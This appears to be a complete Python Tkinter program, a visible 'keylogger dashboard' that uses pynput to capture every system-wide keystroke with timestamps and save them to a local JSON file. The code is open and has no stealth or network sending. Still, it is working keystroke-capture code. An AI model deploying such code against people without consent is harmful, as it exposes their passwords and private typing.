import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import json
import threading
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Python Keylogger - JSON Dashboard")
        self.root.geometry("500x400")
        
        self.logs = []
        self.is_logging = False
        self.listener = None

        # UI Elements
        self.label = tk.Label(root, text="Keylogger Status: Stopped", fg="red", font=("Arial", 12, "bold"))
        self.label.pack(pady=10)

        self.start_btn = tk.Button(root, text="Start Logging", command=self.start_logging, bg="green", fg="white")
        self.start_btn.pack(pady=5)

        self.stop_btn = tk.Button(root, text="Stop & Save JSON", command=self.stop_logging, state=tk.DISABLED, bg="red", fg="white")
        self.stop_btn.pack(pady=5)

        self.display_area = scrolledtext.ScrolledText(root, width=50, height=15)
        self.display_area.pack(pady=10)

    def on_press(self, key):
        if self.is_logging:
            try:
                k = key.char
            except AttributeError:
                k = str(key)
            
            entry = {"timestamp": datetime.now().strftime("%H:%M:%S"), "key": k}
            self.logs.append(entry)
            
            # UI update (Live feed)
            self.display_area.insert(tk.END, f"[{entry['timestamp']}] Pressed: {k}\n")
            self.display_area.yview(tk.END)

    def start_logging(self):
        self.is_logging = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.label.config(text="Keylogger Status: Running...", fg="green")
        
        # Start listener in a separate thread
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.is_logging = False
        if self.listener:
            self.listener.stop()
        
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.label.config(text="Keylogger Status: Stopped & Saved", fg="blue")

        # Save to JSON file
        with open("logs.json", "w") as f:
            json.dump(self.logs, f, indent=4)
        print("Data saved to logs.json")

# Run the App
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
    